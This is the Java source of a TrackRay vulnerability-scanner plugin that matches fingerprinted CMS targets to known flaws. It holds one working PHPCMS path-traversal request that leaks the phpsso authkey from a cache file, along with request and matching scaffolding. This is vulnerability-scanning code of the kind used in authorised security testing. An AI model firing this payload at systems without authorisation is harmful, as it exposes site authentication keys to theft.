package com.trackray.module.auxiliary;

import com.trackray.base.annotation.Plugin;
import com.trackray.base.annotation.Rule;
import com.trackray.base.bean.ResultItem;
import com.trackray.base.bean.Task;
import com.trackray.base.bean.Vulnerable;
import com.trackray.base.enums.FingerPrint;
import com.trackray.base.enums.HttpMethod;
import com.trackray.base.enums.VulnLevel;
import com.trackray.base.httpclient.Response;
import com.trackray.base.httpclient.ResponseStatus;
import com.trackray.base.plugin.CommonPlugin;
import org.apache.commons.lang.StringUtils;
import org.apache.http.Header;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

@Rule(enable = false)
@Plugin(value = "simpleVulRule" ,title = "简单CMS漏洞检测规则" , author = "blue")
public class SimpleVulRule extends CommonPlugin<List<Vulnerable>> {
    private String target;
    private Task task;
    private List<Vulnerable> vulns = new ArrayList<>();

    private List<Payloader> doSwitch(FingerPrint finger) {
        List<Payloader> loaders = new ArrayList<>();
        switch (finger) {
            case $phpcms:
                loaders.add(new Payloader("/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\\..\\..\\phpsso_server\\caches\\caches_admin\\caches_data\\applist&path=admin", new Custom() {
                    public boolean fun(Response response) throws Exception {
                        return StringUtils.length(response.getStatus().getContentString())>10&&response.getStatus().getContentString().contains("aaaaa")?true:false;
                    }},Vulnerable.builder().level(VulnLevel.DANGER.getLevel()).vulName("phpcms authkey泄漏").build()));
                break;
            case $Discuz:
                break;
            default:

                break;
        }
        return loaders;
    }

    @Override
    public boolean check(Map param) {
        target = param.get("target").toString();
        if (param.containsKey("task"))
        {
            task = (Task) param.get("task");
        }
        return true;
    }

    @Override
    public List<Vulnerable> start() {
        if (!isNull(task)){
            ResultItem item = task.getResult().getItems().get(target);
            FingerPrint finger = item.getSystemInfo().getFinger();
            if (finger!=FingerPrint.unknown){
                test(doSwitch(finger));
            }
        }
        return vulns;
    }

    private void test(List<Payloader> payloaders) {
        for (Payloader payloader : payloaders) {
            crawlerPage.getRequest().setUrl(payloader.url);
            crawlerPage.getRequest().setHttpMethod(payloader.method);
            if (StringUtils.isNotBlank(payloader.data)){
                crawlerPage.getRequest().setParamStr(payloader.data);
            }
            if (payloader.headers!=null && payloader.headers.length>0){
                for (Header header : payloader.headers) {
                    crawlerPage.getRequest().addHttpHeader(header);
                }
            }
            try {
                fetcher.run(crawlerPage);
            }catch (Exception e){
                continue;
            }


            if (payloader.getCustom()!=null){
                try {
                    if (payloader.custom.fun(crawlerPage.getResponse())){
                        addVul(payloader);
                    }
                } catch (Exception e) {
                    continue;
                }
            }else{

                ResponseStatus status = crawlerPage.getResponse().getStatus();

                if (status.getStatusCode() == payloader.respCode){
                    if (StringUtils.contains(status.getContentString() , payloader.matchStr)){
                        addVul(payloader);
                    }
                }
            }
        }
    }
    private void addVul(Payloader payloader){
        if (!isNull(task)){
            task.getResult().getItems().get(target).getVulns().add(payloader.vuln);
        }
        payloader.vuln.setAffectsUrl(payloader.url);
        payloader.vuln.setRequest(payloader.data);
        vulns.add(payloader.vuln);

    }

    interface Custom{
        public boolean fun(Response response) throws Exception;
    }

    class Payloader{
        private String url="";
        private HttpMethod method = HttpMethod.GET;
        private String data="";
        private Header[] headers;
        private String matchStr="";
        private int respCode = 200;
        private Vulnerable vuln;
        private Custom custom;

        public Payloader() {
        }

        public Payloader(String url, Custom custom) {
            this.url = url;
            this.custom = custom;
        }

        public Payloader(String url, String data, Custom custom) {
            this.url = url;
            this.data = data;
            this.custom = custom;
        }
        public Payloader(String url, Custom custom , Vulnerable vuln) {
            this.url = url;
            this.custom = custom;
            this.vuln = vuln;
        }
        public Payloader(String url, String matchStr, Vulnerable vuln) {
            this.url = url;
            this.matchStr = matchStr;
            this.vuln = vuln;
        }

        public Payloader(String url, HttpMethod method, String data, String matchStr, int respCode, Vulnerable vuln) {
            this.url = url;
            this.method = method;
            this.data = data;
            this.matchStr = matchStr;
            this.respCode = respCode;
            this.vuln = vuln;
        }

        public Payloader(String url, HttpMethod method, String data, Header[] headers, String matchStr, int respCode, Vulnerable vuln) {
            this.url = url;
            this.method = method;
            this.data = data;
            this.headers = headers;
            this.matchStr = matchStr;
            this.respCode = respCode;
            this.vuln = vuln;
        }

        public Payloader(String url, HttpMethod method, String data, String matchStr, int respCode) {
            this.url = url;
            this.method = method;
            this.data = data;
            this.matchStr = matchStr;
            this.respCode = respCode;
        }

        public Payloader(String url, String matchStr, int respCode) {
            this.url = url;
            this.matchStr = matchStr;
            this.respCode = respCode;
        }

        public Payloader(String url, HttpMethod method, String data, Header[] headers, String matchStr, int respCode) {
            this.url = url;
            this.method = method;
            this.data = data;
            this.headers = headers;
            this.matchStr = matchStr;
            this.respCode = respCode;
        }
        public Payloader post(String post){
            data = post;
            method=HttpMethod.POST;
            return this;
        }

        public Payloader url(String url){
            setUrl(url);
            return this;
        }
        public Payloader custom(Custom custom){
            setCustom(custom);
            return this;
        }
        public Payloader matcher(String matche){
            setMatchStr(matche);
            return this;
        }
        public Payloader vulnerable(Vulnerable v){
            setVuln(v);
            return this;
        }
        public Payloader code(int code){
            setRespCode(code);
            return this;
        }
        public Payloader header(Header[] headers){
            setHeaders(headers);
            return this;
        }
        public String getUrl() {
            return url;
        }

        public void setUrl(String url) {
            this.url = url;
        }

        public HttpMethod getMethod() {
            return method;
        }

        public void setMethod(HttpMethod method) {
            this.method = method;
        }

        public String getData() {
            return data;
        }

        public void setData(String data) {
            this.data = data;
        }

        public Header[] getHeaders() {
            return headers;
        }

        public void setHeaders(Header[] headers) {
            this.headers = headers;
        }

        public String getMatchStr() {
            return matchStr;
        }

        public void setMatchStr(String matchStr) {
            this.matchStr = matchStr;
        }

        public int getRespCode() {
            return respCode;
        }

        public void setRespCode(int respCode) {
            this.respCode = respCode;
        }

        public Vulnerable getVuln() {
            return vuln;
        }

        public void setVuln(Vulnerable vuln) {
            this.vuln = vuln;
        }

        public Custom getCustom() {
            return custom;
        }

        public void setCustom(Custom custom) {
            this.custom = custom;
        }
    }
}
